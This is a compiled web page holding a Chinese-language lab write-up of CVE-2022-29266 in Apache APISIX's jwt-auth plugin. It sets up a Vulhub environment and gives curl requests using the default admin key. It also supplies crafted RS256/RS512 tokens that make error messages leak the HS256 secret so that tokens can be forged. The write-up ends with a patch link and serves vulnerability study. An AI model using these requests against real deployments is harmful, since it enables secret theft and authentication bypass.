import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as d,o as r,c as l,a as e,b as i,d as n,e as s}from"./app-58e4a7d6.js";const u={},o=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),c=e("p",null,"在 2.13.1 之前的 Apache APISIX 中，由于 APISIX 中的 jwt-auth 插件依赖于 lua-resty-jwt 库，而在 lua-resty-jwt 库返回的错误信息中可能会包含 JWT 的 sceret 值，因此对于开启了 jwt-auth 插件的 APISIX 存在 JWT sceret 的泄露，从而造成对 JWT 的伪造风险。",-1),p=e("p",null,"参考链接：",-1),v={href:"https://wiki.teamssix.com/CloudNative/APISIX/apisix-cve-2022-29266.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://xz.aliyun.com/t/11283",target:"_blank",rel:"noopener noreferrer"},b=s(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Apache Apisix &lt; 2.13.1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 启动一个 Apache APISIX 2.11.0 环境。docker-compose.yml 如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>version: &quot;2&quot;

services:
  apisix:
    image: vulhub/apisix:2.11.0
    volumes:
      - ./config.yml:/usr/local/apisix/conf/config.yaml:ro
    depends_on:
      - etcd
    ports:
      - &quot;9080:9080&quot;
      - &quot;9091:9091&quot;
      - &quot;9443:9443&quot;
  etcd:
    image: bitnami/etcd:3.4.15
    environment:
      ETCD_ENABLE_V2: &quot;true&quot;
      ALLOW_NONE_AUTHENTICATION: &quot;yes&quot;
      ETCD_ADVERTISE_CLIENT_URLS: &quot;http://0.0.0.0:2379&quot;
      ETCD_LISTEN_CLIENT_URLS: &quot;http://0.0.0.0:2379&quot;
    ports:
      - &quot;2379:2379/tcp&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，访问 <code>http://your-ip:9080</code> 即可查看到默认的 404 页面。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702134437136.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="前置知识" tabindex="-1"><a class="header-anchor" href="#前置知识" aria-hidden="true">#</a> 前置知识</h2><p>JWT 的全称是 Json Web Token，是一种基于 JSON 的、用于在网络上声明某种主张的令牌（token）规范。JWT 通常由 Header、Payload、Signature 三部分组成，格式如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>Header.Payload.Signature
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>JWT 的第三部分 Signature 是对 Header 和 Payload 部分的签名，起到防止数据篡改的作用，如果知道了 Signature 内容，那么就可以伪造 JWT 了。</p><p>JWT Signature 的 HS256 和 RS256 算法如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># HS256
signature = HMACSHA256( base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload), secret );
   
# RS256   
signature = RSASHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload), publicKey, privateKey)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>其中，生成 RS256 公钥和私钥：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 生成私钥</span>
openssl genrsa <span class="token parameter variable">-out</span> private.key <span class="token number">2048</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token comment"># 生成公钥</span>
openssl rsa <span class="token parameter variable">-in</span> private.key <span class="token parameter variable">-pubout</span> <span class="token parameter variable">-out</span> public.key
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,18),g={href:"https://jwt.io/",target:"_blank",rel:"noopener noreferrer"},h=s(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{&quot;key&quot;: &quot;test-key&quot;}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>此处 Payload 中的 key 值需要和下面创建 consumer 对象时的 key 一致，生成的 JWT 值如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ0ZXN0LWtleSJ9.stLb58YP5evXquu2ObWZG30MKHGAvAdQXrADdJK42BSVonFVkwK5cF4kora0UkzlnKjpUYCRfwF75Hdl4XOlrV7_MkVJfkZTpSlRmKIPCKN2JDqgsuK9TPrkjjGQzF91sA_7sx0QsL-hbmtjdfaizvhN0-2XGKzVEWiGuoOPK7pw22vEgXr-k4CddDORyaPVms5D1au92FAxmwH8sXRGydVSpBMfj70RQzcdO-qg6k1VODE8LP4Bcv8FJ153PRv1LuCMP1aeqPgXOBp8tXay4OAMGcKJSiMVwnD_sJ4lEGjVEhGQUuYhw7PNrakh6c_oza3ID7W9Bn6mWhagpVfkqA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702134014361.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>创建一个 consumer 对象，并设置 jwt-auth 的值，默认是 HS256 算法，secret 值为 <code>threekiii-secret-key</code></p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:9080/apisix/admin/consumers -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;
{
&quot;username&quot;: &quot;threekiii&quot;,
&quot;plugins&quot;: {
&quot;jwt-auth&quot;: {
&quot;key&quot;: &quot;test-key&quot;,
&quot;secret&quot;: &quot;threekiii-secret-key&quot;
}
}
}&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702134622145.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>然后再创建路由对象，并开启 jwt-auth 插件：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:9080/apisix/admin/routes/1 -H &#39;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#39; -X PUT -d &#39;
{
&quot;methods&quot;: [&quot;GET&quot;],
&quot;uri&quot;: &quot;/index.html&quot;,
&quot;plugins&quot;: {
&quot;jwt-auth&quot;: {}
},
&quot;upstream&quot;: {
&quot;type&quot;: &quot;roundrobin&quot;,
&quot;nodes&quot;: {
&quot;0.0.0.0:80&quot;: 1
}
}
}&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702134642060.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当启用了 jwt-auth 插件后，会增加 <code>/apisix/plugin/jwt/sign</code> 这个接口，访问这个 api，可以获取到认证 token：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:9080/apisix/plugin/jwt/sign?key=test-key -i
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702134828077.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将刚才由 RS256 算法生成的 JWT 值发送给 HS256 算法验证的路由，这样就可以获得刚才设置的 secret 值了：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:9080/index.html?jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ0ZXN0LWtleSJ9.stLb58YP5evXquu2ObWZG30MKHGAvAdQXrADdJK42BSVonFVkwK5cF4kora0UkzlnKjpUYCRfwF75Hdl4XOlrV7_MkVJfkZTpSlRmKIPCKN2JDqgsuK9TPrkjjGQzF91sA_7sx0QsL-hbmtjdfaizvhN0-2XGKzVEWiGuoOPK7pw22vEgXr-k4CddDORyaPVms5D1au92FAxmwH8sXRGydVSpBMfj70RQzcdO-qg6k1VODE8LP4Bcv8FJ153PRv1LuCMP1aeqPgXOBp8tXay4OAMGcKJSiMVwnD_sJ4lEGjVEhGQUuYhw7PNrakh6c_oza3ID7W9Bn6mWhagpVfkqA -i
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702135025523.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>当拿到这个 sceret 值后，就可以伪造 JWT Token 了。</p>`,17),x={href:"https://jwt.io/",target:"_blank",rel:"noopener noreferrer"},k=s(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ0ZXN0LWtleSJ9.OJb_ZfTWdb8PvVWBjsFssyIIBfGhqfoR16FzNFzA4hxqpAqcoIzF_yBja6RWOH6jWCrtuPViLwkmMEjU1HZ_UFaKKFAuHiYe9w7aOrV5eWnI9XmpYJUlXwV_2EveaRa9y0pjPu2miqeemPTZXGlK28aqt9idmWySIsqgEwjpzrqHnej9opoJcZ1kBOdm-ED3MMi8-dDE2CqaC1JqIJsVz3_9a1FoYJLwwugTD1msUIdQ9DTRskgcPBj2KPvPx6hHO-gjMVxTvpXIyjjzFfomWxvsOdhjxd342PJOWcWkEO7n0G4NV2weIhQbyLUiPRHEE7QPaxNxcA9-43jk9TR5_g
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702135316039.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将由 RS512 算法生成的 JWT 值也可以触发漏洞，获得 secret 值：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>curl http://your-ip:9080/index.html?jwt=eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ0ZXN0LWtleSJ9.OJb_ZfTWdb8PvVWBjsFssyIIBfGhqfoR16FzNFzA4hxqpAqcoIzF_yBja6RWOH6jWCrtuPViLwkmMEjU1HZ_UFaKKFAuHiYe9w7aOrV5eWnI9XmpYJUlXwV_2EveaRa9y0pjPu2miqeemPTZXGlK28aqt9idmWySIsqgEwjpzrqHnej9opoJcZ1kBOdm-ED3MMi8-dDE2CqaC1JqIJsVz3_9a1FoYJLwwugTD1msUIdQ9DTRskgcPBj2KPvPx6hHO-gjMVxTvpXIyjjzFfomWxvsOdhjxd342PJOWcWkEO7n0G4NV2weIhQbyLUiPRHEE7QPaxNxcA9-43jk9TR5_g -i
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20240702135257240.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2>`,6),q={href:"https://lists.apache.org/thread/6qpfyxogbvn18g9xr8g218jjfjbfsbhr",target:"_blank",rel:"noopener noreferrer"};function f(_,y){const a=d("ExternalLinkIcon");return r(),l("div",null,[o,c,p,e("ul",null,[e("li",null,[e("a",v,[i("https://wiki.teamssix.com/CloudNative/APISIX/apisix-cve-2022-29266.html"),n(a)])]),e("li",null,[e("a",m,[i("https://xz.aliyun.com/t/11283"),n(a)])])]),b,e("p",null,[i("在 "),e("a",g,[i("jwt.io"),n(a)]),i(" 生成一个 RS256 算法的 JWT 值。Payload 改为以下内容：")]),h,e("p",null,[i("同样，使用 RS512 算法也能触发这个漏洞。在 "),e("a",x,[i("jwt.io"),n(a)]),i(" 上生成 RS512 的 JWT 值如下：")]),k,e("p",null,[i("目前厂商已发布升级补丁以修复漏洞，补丁获取链接： "),e("a",q,[i("https://lists.apache.org/thread/6qpfyxogbvn18g9xr8g218jjfjbfsbhr"),n(a)])])])}const j=t(u,[["render",f],["__file","Apache APISIX jwt-auth 插件存在 JWT sceret 泄漏 CVE-2022-29266.html.vue"]]);export{j as default};
